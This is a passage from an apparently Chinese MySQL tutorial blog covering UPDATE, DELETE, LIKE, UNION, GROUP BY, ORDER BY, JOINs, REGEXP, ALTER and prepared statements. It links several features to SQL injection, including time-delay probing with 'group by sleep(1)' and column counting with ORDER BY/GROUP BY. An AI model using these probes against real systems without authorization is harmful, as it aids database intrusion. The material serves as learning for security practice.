<td align="left">不等于，检测两个值是否相等，如果不相等返回true</td>
<td align="left">(A !&#x3D; B) 返回 true。</td>
</tr>
<tr>
<td align="left">&gt;</td>
<td align="left">大于号，检测左边的值是否大于右边的值, 如果左边的值大于右边的值返回true</td>
<td align="left">(A &gt; B) 返回false。</td>
</tr>
<tr>
<td align="left">&lt;</td>
<td align="left">小于号，检测左边的值是否小于右边的值, 如果左边的值小于右边的值返回true</td>
<td align="left">(A &lt; B) 返回 true。</td>
</tr>
<tr>
<td align="left">&gt;&#x3D;</td>
<td align="left">大于等于号，检测左边的值是否大于或等于右边的值, 如果左边的值大于或等于右边的值返回true</td>
<td align="left">(A &gt;&#x3D; B) 返回false。</td>
</tr>
<tr>
<td align="left">&lt;&#x3D;</td>
<td align="left">小于等于号，检测左边的值是否小于或等于右边的值, 如果左边的值小于或等于右边的值返回true</td>
<td align="left">(A &lt;&#x3D; B) 返回 true。</td>
</tr>
</tbody></table>
<p>如果给定的条件在表中没有任何匹配的记录，那么查询不会返回任何数据。</p>
<p>前面讲过数据库的基本操作是增删查改，那我们前面讲了如何增和删，那我们现在来讲一下怎么改，这时候就可以用到UPDATE命令了</p>
<h3 id="5-UPDATE更新数据"><a href="#5-UPDATE更新数据" class="headerlink" title="5. UPDATE更新数据"></a>5. UPDATE更新数据</h3><p>如果我们需要修改或更新 MySQL 中的数据，我们可以使用 <strong>UPDATE</strong> 命令来操作。</p>
<p>语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name</span><br><span class="line">SET column1 = value1, column2 = value2, ...</span><br><span class="line">WHERE condition;</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li><code>table_name</code> 是你要更新数据的表的名称。</li>
<li><code>column1</code>, <code>column2</code>, … 是你要更新的列的名称。</li>
<li><code>value1</code>, <code>value2</code>, … 是新的值，用于替换旧的值。</li>
<li><code>WHERE condition</code> 是一个可选的子句，用于指定更新的行。如果省略 <code>WHERE</code> 子句，将更新表中的所有行。</li>
</ul>
<p>当然，我们可以同时更新很多个字段，也可以在一个表中同时更新数据，当我们需要更新数据表中指定行的数据时 WHERE 子句是非常有用的。</p>
<p>当然我们用表达式去更新数据的value也是可以的</p>
<p>我们试一下</p>
<p>1.更新单个列</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE<span class="built_in"> users </span><span class="built_in">SET</span> <span class="attribute">username</span>=<span class="string">&#x27;wanth3f1ag&#x27;</span> WHERE <span class="attribute">id</span>=2;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501162728136.png" alt="image-20250501162728136"></p>
<p>2.更新多个列</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE<span class="built_in"> users </span><span class="built_in">SET</span> <span class="attribute">username</span>=<span class="string">&#x27;wanth3f1ag&#x27;</span>,password=123456 WHERE <span class="attribute">id</span>=2;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501162800467.png" alt="image-20250501162800467"></p>
<p>3.使用表达式</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE<span class="built_in"> users </span><span class="built_in">SET</span> <span class="attribute">username</span>=<span class="string">&#x27;wanth3f1ag&#x27;</span>,password=123*2 WHERE <span class="attribute">id</span>=2;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501162818925.png" alt="image-20250501162818925"></p>
<p>4.更新所有行</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE<span class="built_in"> users </span><span class="built_in">SET</span> <span class="attribute">password</span>=123456;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501162836667.png" alt="image-20250501162836667"></p>
<p> 5.更新嵌套查询</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> passwrod =(子查询语句) <span class="keyword">where</span>子语句;</span><br></pre></td></tr></table></figure>

<p>讲完了改的部分，我们来讲一下mysql中的删</p>
<h3 id="6-DELETE删除数据"><a href="#6-DELETE删除数据" class="headerlink" title="6.DELETE删除数据"></a>6.DELETE删除数据</h3><p>可以使用 <strong>DELETE FROM</strong> 命令来删除 MySQL 数据表中的记录</p>
<p>语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li><code>table_name</code> 是你要删除数据的表的名称。</li>
<li><code>WHERE condition</code> 是一个可选的子句，用于指定删除的行。如果省略 <code>WHERE</code> 子句，将删除表中的所有行。</li>
</ul>
<p>和update一样，可以用WHERE子语句去设置条件精准指定目标</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501163025582.png" alt="image-20250501163025582"></p>
<h3 id="LIKE子语句和通配符"><a href="#LIKE子语句和通配符" class="headerlink" title="LIKE子语句和通配符"></a>LIKE子语句和通配符</h3><p>用于进行模糊匹配的关键字。它通常与通配符(%)一起使用，用于搜索符合某种模式的字符串。</p>
<p>%百分号表示任意字符，和我们unix中的*是一样的</p>
<p>语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> <span class="keyword">pattern</span>;</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li><code>column1</code>, <code>column2</code>, … 是你要选择的列的名称，如果使用 <code>*</code> 表示选择所有列。</li>
<li><code>table_name</code> 是你要从中查询数据的表的名称。</li>
<li><code>column_name</code> 是你要应用 <code>LIKE</code> 子句的列的名称。</li>
<li><code>pattern</code> 是用于匹配的模式，可以包含通配符。</li>
</ul>
<p>LIKE子语句可以在WHERE子句中用，可以用来代替where子语句中的等号，**%** 通配符表示零个或多个字符。例如，**’a%’** 匹配以字母 <strong>‘a’</strong> 开头的任何字符串。</p>
<p>我们试一下</p>
<p>假设我们有以下表</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501163222396.png" alt="image-20250501163222396"></p>
<p>1.<code>%</code> 通配符表示零个或多个字符。例如，**’w%’** 匹配以字母 <strong>‘w’</strong> 开头的任何字符串。</p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;w%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501163307391.png" alt="image-20250501163307391"></p>
<p>2.<code>_ </code>通配符表示一个字符。例如，**’_a%’** 匹配第二个字母为 <strong>‘a’</strong> 的任何字符串。</p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;_u%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501163542370.png" alt="image-20250501163542370"></p>
<p>3.组合使用 <code>%</code> 和<code> _</code>，例如,<code>&#39;w%a_&#39;</code>表示第一个字符是w，然后是0或者无数个字符，接着是字符a，最后是匹配一个任意字符</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250117005436111.png" alt="image-20250117005436111"></p>
<p>以上就是我们用通配符进行模糊匹配的方法</p>
<h3 id="7-UNION联合查询操作"><a href="#7-UNION联合查询操作" class="headerlink" title="7.UNION联合查询操作"></a>7.UNION联合查询操作</h3><p>UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合，并去除重复的行。</p>
<p>要求:必须由两个或多个 SELECT 语句组成，每个 SELECT 语句的列数和对应位置的数据类型必须相同。</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2, ... FROM table1 [WHERE condition1] UNION SELECT column1, column2, ... FROM table2 [WHERE condition2] [ORDER BY column1, column2, ...];</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li><code>column1</code>, <code>column2</code>, … 是你要选择的列的名称，如果使用 <code>*</code> 表示选择所有列。</li>
<li><code>table1</code>, <code>table2</code>, … 是你要从中查询数据的表的名称。</li>
<li><code>condition1</code>, <code>condition2</code>, … 是每个 <code>SELECT</code> 语句的过滤条件，是可选的。</li>
<li><code>ORDER BY</code> 子句是一个可选的子句，用于指定合并后的结果集的排序顺序。</li>
</ul>
<p>我们来试一下</p>
<p>假如我们有以下表</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501163930059.png" alt="image-20250501163930059"></p>
<p>然后我们用union去连接两个select查询语句,那么会得到:</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501164023543.png" alt="image-20250501164023543"></p>
<p>可以看到这里已经将id和password的查询结果全部集合然后进行了一个排列</p>
<p>但是我们要注意:<em>UNION 操作符在合并结果集时会去除重复行，而 UNION ALL 不会去除重复行</em></p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501164225475.png" alt="image-20250501164225475"></p>
<p>我这里创建了一个密码和其他某个一样的密码，然后分别进行了union和union all联合查询，可以发现两个的结果和上面的知识点是一样的。</p>
<ul>
<li><strong>()中的内容优先查询</strong></li>
</ul>
<p>子查询，优先执行<code>()</code>中的查询语句,其实这也是我们sql注入的关键点，通过优先级去将先执行的语句的结果当成后执行语句的参数参与执行查询</p>
<h3 id="GROUP-BY-子语句"><a href="#GROUP-BY-子语句" class="headerlink" title="GROUP BY 子语句"></a>GROUP BY 子语句</h3><p>GROUP BY 语句根据一个或多个列对结果集进行分组。</p>
<p>语法</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, aggregate_function(column2)</span><br><span class="line"><span class="keyword">FROM</span> <span class="built_in">table_name</span></span><br><span class="line"><span class="keyword">WHERE</span> condition</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> column1;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>column1</code>：指定分组的列。</li>
<li><code>aggregate_function(column2)</code>：对分组后的每个组执行的聚合函数。</li>
<li><code>table_name</code>：要查询的表名。</li>
<li><code>condition</code>：可选，用于筛选结果的条件。</li>
</ul>
<p>group by语句还可以用来探测数据的多少</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">group</span> <span class="title">by</span> sleep(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>假设我这里有两条数据，那么就会延迟2s</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250507173534809.png" alt="image-20250507173534809"></p>
<h3 id="ORDER-BY-子语句"><a href="#ORDER-BY-子语句" class="headerlink" title="ORDER BY 子语句"></a>ORDER BY 子语句</h3><p><strong>ORDER BY(排序)</strong> 语句可以按照一个或多个列的值进行升序（<strong>ASC</strong>）或降序（<strong>DESC</strong>）排序。和group by一样，<code>group by</code>正常用在数据的分组。但是order by 和 group by 还可以用于实现判断数据表中的列数。</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501164508719.png" alt="image-20250501164508719"></p>
<p>当<code>group by</code>后面的数字大于前面select查询的列数时，会产生报错。</p>
<p>语法:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table_name</span><br><span class="line">ORDER BY column1 [ASC | DESC], column2 [ASC | DESC], ...;</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li><code>column1</code>, <code>column2</code>, … 是你要选择的列的名称，如果使用 <code>*</code> 表示选择所有列。</li>
<li><code>table_name</code> 是你要从中查询数据的表的名称。</li>
<li><code>ORDER BY column1 [ASC | DESC], column2 [ASC | DESC], ...</code> 是用于指定排序顺序的子句。<code>ASC</code> 表示升序（默认），<code>DESC</code> 表示降序。</li>
</ul>
<p>使用方法</p>
<p>1.单列排序</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250117005809461.png" alt="image-20250117005809461"></p>
<p>2.多列排序</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> department_id <span class="keyword">ASC</span>, hire_date <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<p>3.使用数字表示列的位置</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name, salary</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">3</span> <span class="keyword">DESC</span>, <span class="number">1</span> <span class="keyword">ASC</span>;</span><br></pre></td></tr></table></figure>

<p>按第三列（salary）降序 DESC 排序，然后按第一列（first_name）升序 ASC 排序。</p>
<h3 id="group-concat-函数"><a href="#group-concat-函数" class="headerlink" title="group_concat()函数"></a>group_concat()函数</h3><p>将数据合并到一行显示</p>
<p>例如</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(<span class="built_in">id</span>,username,password) </span><br><span class="line">from <span class="built_in">users</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501165205561.png" alt="image-20250501165205561"></p>
<h3 id="8-JOIN左右连接"><a href="#8-JOIN左右连接" class="headerlink" title="8.JOIN左右连接"></a>8.JOIN左右连接</h3><p>这个的话是参考了一位师傅的文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u011047968/article/details/107744901">MYSQL语法：左连接、右连接、内连接、全外连接</a></p>
<p>JOIN 按照功能大致分为如下：</p>
<ul>
<li>left join（左连接）：返回包括左表中的所有记录和右表中连接字段相等的记录。</li>
<li>right join（右连接）：返回包括右表中的所有记录和左表中连接字段相等的记录。</li>
<li>inner join（内连接）：只返回两个表中连接字段相等的行。</li>
</ul>
<p>概念的话听起来不好理解，看看师傅给出的图示</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502192842462.png" alt="image-20250502192842462"></p>
<h4 id="LEFT-JOIN左连接"><a href="#LEFT-JOIN左连接" class="headerlink" title="LEFT JOIN左连接"></a>LEFT JOIN左连接</h4><p>LEFT JOIN 返回左表的所有行，并包括右表中匹配的行，如果右表中没有匹配的行，将返回 NULL 值</p>
<p>语法：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> table2 <span class="keyword">ON</span> table1.column_name = table2.column_name;</span><br></pre></td></tr></table></figure>

<p>这里on后面的就是我们的连接条件</p>
<p>我们本地测试一下</p>
<p>先在本地创建两个表，之前有过一个users了，这里就再创建一个users2并插入数据</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502194528555.png" alt="image-20250502194528555"></p>
<p>然后我们用左连接</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">left</span> <span class="keyword">join</span> users2 <span class="keyword">on</span> users.id = users2.id;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502194621453.png" alt="image-20250502194621453"></p>
<p>这里返回了左表的所有和右表中和左表匹配的行，并且没有的地方返回NULL</p>
<h4 id="RIGHT-JOIN右连接"><a href="#RIGHT-JOIN右连接" class="headerlink" title="RIGHT JOIN右连接"></a>RIGHT JOIN右连接</h4><p>RIGHT JOIN 返回右表的所有行，并包括左表中匹配的行，如果左表中没有匹配的行，将返回 NULL 值</p>
<p>语法：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> table2 <span class="keyword">ON</span> table1.column_name = table2.column_name;</span><br></pre></td></tr></table></figure>

<p>还是刚刚的例子，我们试一下</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502194857297.png" alt="image-20250502194857297"></p>
<p>可以看到这里只匹配了左表的两行，而不会显示不匹配的行数据</p>
<h4 id="inner-join内连接"><a href="#inner-join内连接" class="headerlink" title="inner join内连接"></a>inner join内连接</h4><p>INNER JOIN 返回两个表中满足连接条件的匹配行，相当于交集</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> table2 <span class="keyword">ON</span> table1.column_name = table2.column_name;</span><br></pre></td></tr></table></figure>

<p>我们试一下</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502195047549.png" alt="image-20250502195047549"></p>
<p>可以看到这里和上面的右连接是一样的结果，这是因为我刚好把例子做的很类似，如果在user2加上一个不一样的行则右连接就会变成这样</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502195204371.png" alt="image-20250502195204371"></p>
<h3 id="9-运算符优先级"><a href="#9-运算符优先级" class="headerlink" title="9.运算符优先级"></a>9.运算符优先级</h3><p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250502174953509.png" alt="image-20250502174953509"></p>
<h3 id="10-regexp和rlike正则匹配"><a href="#10-regexp和rlike正则匹配" class="headerlink" title="10.regexp和rlike正则匹配"></a>10.regexp和rlike正则匹配</h3><p>REGEXP 和RLIKE用于检查一个字符串是否匹配指定的正则表达式模式</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502200245616.png" alt="image-20250502200245616"></p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502200230188.png" alt="image-20250502200230188"></p>
<p>语法：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, <span class="params">...</span></span><br><span class="line">FROM table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name REGEXP <span class="string">&#x27;pattern&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>例如，</p>
<p>查找 name 字段中以 <strong>‘st’</strong> 为开头的所有数据</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="type">name</span> <span class="keyword">FROM</span> person_tbl <span class="keyword">WHERE</span> <span class="type">name</span> REGEXP <span class="string">&#x27;^st&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>查找 name 字段中以 <strong>‘ok’</strong> 为结尾的所有数据：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="type">name</span> <span class="keyword">FROM</span> person_tbl <span class="keyword">WHERE</span> <span class="type">name</span> REGEXP <span class="string">&#x27;ok$&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>需要注意的是：MySQL 的正则表达式默认是<strong>不区分大小写</strong>的。如果需要区分大小写，可以使用 <code>BINARY</code> 关键字</p>
<h3 id="11-ALTER修改表和字段"><a href="#11-ALTER修改表和字段" class="headerlink" title="11.ALTER修改表和字段"></a>11.ALTER修改表和字段</h3><p>MySQL 的 <strong>ALTER</strong> 命令用于修改数据库、表和索引等对象的结构。</p>
<p><strong>ALTER</strong> 命令允许你添加、修改或删除数据库对象，并且可以用于更改表的列定义、添加约束、创建和删除索引等操作。</p>
<ul>
<li>添加列</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="built_in">table_name</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">COLUMN</span> new_column_name datatype;</span><br></pre></td></tr></table></figure>

<ul>
<li>修改列的数据类型</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="built_in">TABLE_NAME</span></span><br><span class="line">MODIFY <span class="keyword">COLUMN</span> <span class="built_in">column_name</span> new_datatype;</span><br></pre></td></tr></table></figure>

<ul>
<li>修改列名</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="built_in">table_name</span></span><br><span class="line">CHANGE <span class="keyword">COLUMN</span> old_column_name new_column_name datatype;</span><br></pre></td></tr></table></figure>

<ul>
<li>删除列</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="built_in">table_name</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> <span class="built_in">column_name</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>修改表名</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> old_table_name</span><br><span class="line"><span class="keyword">RENAME</span> <span class="keyword">TO</span> new_table_name;</span><br></pre></td></tr></table></figure>

<h3 id="12-MYSQL预处理语句"><a href="#12-MYSQL预处理语句" class="headerlink" title="12.MYSQL预处理语句"></a>12.MYSQL预处理语句</h3><p>简单来说就是预处理一个变量代表一个查询语句，用PREPARE 语句去预设一个语句，然后通过EXECUTE语句去执行预处理语句</p>
<h4 id="PREPARE-语句"><a href="#PREPARE-语句" class="headerlink" title="PREPARE 语句"></a>PREPARE 语句</h4><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt_name FROM preparable_stmt</span><br></pre></td></tr></table></figure>

<p>PREPARE 语句会准备一条sql语句，并为其指定一个变量名，而stmt_name可以作为我们后面需要执行该语句的时候的一个替换品，预处理语句使用 执行 <code>EXECUTE</code>，使用 释放 <code>DEALLOCATE PREPARE</code>。</p>
<p>在语句中，<code>?</code> 字符可用作参数标记，用于指示稍后执行查询时数据值绑定到查询的位置</p>
<p>需要注意的是，<strong>此处的语句名称是不区分大小写的</strong>，一会讲完预处理的知识点会进行测试的</p>
<h4 id="EXECUTE-语句"><a href="#EXECUTE-语句" class="headerlink" title="EXECUTE 语句"></a>EXECUTE 语句</h4><p>语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> stmt_name</span><br><span class="line">    [<span class="keyword">USING</span> <span class="variable">@var_name</span> [, <span class="variable">@var_name</span>] ...]</span><br></pre></td></tr></table></figure>

<p>使用 准备语句后 ，可以使用引用该准备好的语句名称的语句<code>PREPARE</code>来执行该语句 。如果准备好的语句包含任何参数标记，则必须提供一个 子句，列出包含要绑定到参数的值的用户变量。参数值只能由用户变量提供，并且子句中变量的名称必须与语句中参数标记的数量完全相同。</p>
<h4 id="DEALLOCATE-PREPARE-语句"><a href="#DEALLOCATE-PREPARE-语句" class="headerlink" title="DEALLOCATE PREPARE 语句"></a>DEALLOCATE PREPARE 语句</h4><p>语法</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">DEALLOCATE</span> | <span class="keyword">DROP</span>&#125; <span class="keyword">PREPARE</span> stmt_name</span><br></pre></td></tr></table></figure>

<p>释放当前会话下生成的预处理语句 <code>PREPARE</code></p>
<p>我们本地测试一下</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; prepare a from <span class="emphasis">&#x27;select * from users where username = ?&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; select * from users;</span></span><br><span class="line"><span class="section">+----+------------+----------+</span></span><br><span class="line"><span class="section">| id | username   | password |</span></span><br><span class="line"><span class="section">+----+------------+----------+</span></span><br><span class="line">|  1 | vu1n4bly   | 888888   |</span><br><span class="line">|  2 | wanth3f1ag | 123456   |</span><br><span class="line">|  3 | bao        | 3        |</span><br><span class="line">|  4 | man        | 1008611  |</span><br><span class="line"><span class="section">|  5 | _1         | 123      |</span></span><br><span class="line"><span class="section">+----+------------+----------+</span></span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set @name = &quot;bao&quot;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; execute a using @name;</span></span><br><span class="line"><span class="section">+----+----------+----------+</span></span><br><span class="line"><span class="section">| id | username | password |</span></span><br><span class="line"><span class="section">+----+----------+----------+</span></span><br><span class="line"><span class="section">|  3 | bao      | 3        |</span></span><br><span class="line"><span class="section">+----+----------+----------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>这里我测过，如果直接在execure中using字符串的话貌似是不行的</p>
<p>然后我们看看大小写敏感问题</p>
